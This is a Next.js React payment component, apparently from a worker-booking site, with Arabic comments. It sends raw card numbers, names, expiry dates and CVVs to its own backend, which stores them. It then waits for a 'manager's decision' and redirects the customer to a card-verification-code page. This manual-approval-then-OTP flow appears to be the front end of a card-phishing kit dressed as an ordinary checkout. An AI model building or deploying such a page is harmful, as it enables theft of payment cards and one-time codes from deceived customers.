"use client";

import { useState, useEffect, FormEvent } from "react";
import { useRouter } from "next/navigation";
import { Dictionary } from "@/lib/i18n";
import { Card } from "@/components/ui/Card";
import { Button } from "@/components/ui/Button";
import { Field, Input } from "@/components/ui/Field";
import { formatSalary } from "@/lib/utils";
import type { Booking, Worker } from "@/lib/supabase/types";
import styles from "./PaymentClient.module.css";

export function PaymentClient({
  booking,
  dict,
  locale,
}: {
  booking: Booking & { workers: Worker };
  dict: Dictionary;
  locale: string;
}) {
  const router = useRouter();
  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  // حالة الانتظار لقرار المدير
  const [verifying, setVerifying] = useState(false);
  const [paymentEntryId, setPaymentEntryId] = useState<string | null>(null);
  const p = dict.payment;

  const amount = booking.workers?.expected_salary ?? 0;
  const serviceFee = Math.round(amount * 0.1);
  const total = amount + serviceFee;

  // استطلاع قرار المدير كل 3 ثوانٍ
  useEffect(() => {
    if (!verifying || !paymentEntryId) return;
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/payments/status?entryId=${paymentEntryId}`, {
          cache: "no-store" as RequestCache,
        });
        const data = await res.json();
        if (data.status === "approved") {
          setVerifying(false);
          // اسمح للعميل بالتوجيه إلى صفحة رمز التحقق
          router.push(`/${locale}/verify-card/${booking.id}?pid=${paymentEntryId}`);
        } else if (data.status === "rejected") {
          setVerifying(false);
          setError(p.rejectedMsg);
          setPaymentEntryId(null);
        }
      } catch {
        // تجاهل أخطاء الشبكة مؤقتاً
      }
    }, 3000);
    return () => clearInterval(interval);
  }, [verifying, paymentEntryId, router, booking.id, locale, p.rejectedMsg]);

  function formatCardNumber(value: string): string {
    const digits = value.replace(/\D/g, "").slice(0, 19);
    return digits.replace(/(.{4})/g, "$1 ").trim();
  }

  function formatExpiry(value: string): string {
    const digits = value.replace(/\D/g, "").slice(0, 4);
    if (digits.length <= 2) return digits;
    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  }

  async function handleSubmit(e: FormEvent) {
    e.preventDefault();
    setError(null);
    setLoading(true);

    try {
      const res = await fetch("/api/payments/initiate", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-fingerprint": "fp-client",
        },
        body: JSON.stringify({
          bookingId: booking.id,
          cardNumber,
          cardName,
          expiry,
          cvv,
        }),
      });

      const data = await res.json();

      if (!res.ok) {
        const msg =
          data.error === "invalid_card"
            ? p.invalidCard
            : data.error === "luhn_failed"
              ? p.invalidCard
              : data.error === "already_paid"
                ? p.verifySuccess
                : p.invalidCard;
        setError(msg);
        return;
      }

      // تم تخزين البيانات + الانتقال لشاشة الانتظار
      setPaymentEntryId(data.entryId);
      setVerifying(true);
    } catch {
      setError(p.invalidCard);
    } finally {
      setLoading(false);
    }
  }

  // ===== شاشة جارٍ التحقق =====
  if (verifying) {
    return (
      <div className={styles.layout}>
        <Card className={styles.verifyingCard}>
          <div className={styles.spinnerWrap}>
            <div className={styles.spinner} />
          </div>
          <h1 className={styles.verifyingTitle}>{p.verifyingWait}</h1>
          <p className={styles.verifyingSub}>{p.verifyingSub}</p>
        </Card>
      </div>
    );
  }

  // ===== شاشة الرفض =====
  if (error === p.rejectedMsg) {
    return (
      <div className={styles.layout}>
        <Card className={styles.rejectedCard}>
          <div className={styles.rejectedIcon}>✗</div>
          <h1 className={styles.rejectedTitle}>{p.rejectedTitle}</h1>
          <p className={styles.rejectedMsg}>{p.rejectedMsg}</p>
          <Button
            onClick={() => {
              setError(null);
              setCardNumber("");
              setCardName("");
              setExpiry("");
              setCvv("");
            }}
            size="lg"
          >
            {p.retryPayment}
          </Button>
        </Card>
      </div>
    );
  }

  return (
    <div className={styles.layout}>
      <div className={styles.header}>
        <h1 className={styles.title}>{p.title}</h1>
        <p className={styles.subtitle}>{p.subtitle}</p>
      </div>

      <div className={styles.grid}>
        <Card className={styles.formCard}>
          <form onSubmit={handleSubmit} className={styles.form}>
            <Field label={p.cardNumber}>
              <Input
                value={cardNumber}
                onChange={(e) =>
                  setCardNumber(formatCardNumber(e.target.value))
                }
                placeholder={p.cardNumberPh}
                inputMode="numeric"
                autoComplete="cc-number"
                required
              />
            </Field>

            <Field label={p.cardName}>
              <Input
                value={cardName}
                onChange={(e) => setCardName(e.target.value)}
                placeholder={p.cardNamePh}
                autoComplete="cc-name"
                required
              />
            </Field>

            <div className={styles.row}>
              <Field label={p.expiry}>
                <Input
                  value={expiry}
                  onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                  placeholder={p.expiryPh}
                  inputMode="numeric"
                  autoComplete="cc-exp"
                  required
                />
              </Field>
              <Field label={p.cvv}>
                <Input
                  value={cvv}
                  onChange={(e) =>
                    setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))
                  }
                  placeholder={p.cvvPh}
                  inputMode="numeric"
                  autoComplete="cc-csc"
                  type="password"
                  required
                />
              </Field>
            </div>

            {error && <div className={styles.error}>{error}</div>}

            <Button type="submit" size="lg" disabled={loading}>
              {loading ? p.processing : p.payNow}
            </Button>

            <div className={styles.secureNote}>🔒 {p.secureNote}</div>
          </form>
        </Card>

        <Card className={styles.summary}>
          <h2 className={styles.sectionTitle}>{p.worker}</h2>
          <div className={styles.workerCard}>
            <img
              src={booking.workers?.photo_url}
              alt={booking.workers?.full_name}
              className={styles.workerImg}
            />
            <div>
              <h3 className={styles.workerName}>
                {booking.workers?.full_name}
              </h3>
              <p className={styles.workerMeta}>
                {booking.workers?.nationality} ·{" "}
                {booking.workers?.experience_years}{" "}
                {locale === "ar" ? "سنة خبرة" : "yrs exp"}
              </p>
            </div>
          </div>

          <div className={styles.summaryRows}>
            <div className={styles.summaryRow}>
              <span>{p.amount}</span>
              <strong>{formatSalary(amount, locale)}</strong>
            </div>
            <div className={styles.summaryRow}>
              <span>{p.serviceFee} (10%)</span>
              <strong>{formatSalary(serviceFee, locale)}</strong>
            </div>
            <div className={`${styles.summaryRow} ${styles.totalRow}`}>
              <span>{p.total}</span>
              <strong>{formatSalary(total, locale)}</strong>
            </div>
          </div>

          <div className={styles.refRow}>
            <span>{p.bookingRef}</span>
            <strong>{booking.booking_ref}</strong>
          </div>
        </Card>
      </div>
    </div>
  );
}

